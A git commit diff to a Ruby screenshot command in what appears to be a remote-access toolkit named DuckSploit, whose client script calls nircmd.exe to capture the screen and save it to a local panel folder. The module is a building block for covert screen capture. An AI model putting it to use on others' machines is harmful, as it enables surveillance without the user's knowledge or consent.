ff8b2940db6b25e20f224685ff576cb6fbebd78a
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-04-08 18:57:05 +0200

    Update screenshot.rb

--- client/scripts/ruby/commands/screenshot.rb
+++ client/scripts/ruby/commands/screenshot.rb
@@ -1,8 +1,8 @@
 require "colorize"
 
 time = Time.new
-filename = "screenshot-#{time1.inspect}"
+filename = "screenshot-#{time.inspect}.png"
 
-system("%windir%\System32\nircmd.exe savescreenshot C:\$DuckSploitw\pannel\#{filename}.png")
+system("C:/Windows/System32/nircmd.exe savescreenshot C:/$DuckSploitw/pannel/#{filename}.png")
 
-out = "Saved as".red.bold.blink
+puts "Saved as".red.bold.blink
